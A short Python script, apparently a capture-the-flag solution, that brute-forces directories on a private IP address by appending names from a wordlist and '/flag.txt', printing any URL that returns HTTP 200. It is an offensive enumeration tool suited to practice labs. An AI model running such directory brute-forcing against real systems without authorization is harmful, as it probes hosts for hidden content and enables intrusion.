#Brute force directories problem
import requests
url1 = 'http://10.12.0.30/'
flag = '/flag.txt'

with open('directories.txt', 'r') as text:
    directories = text.readlines()

for x in directories:
    requests.session()
    url2 = url1 + x + flag
    url2 = url2.replace('\n','')
    resp = requests.get(url2)
    if resp.status_code == 200:
        print(url2)
        continue
    else:
        continue
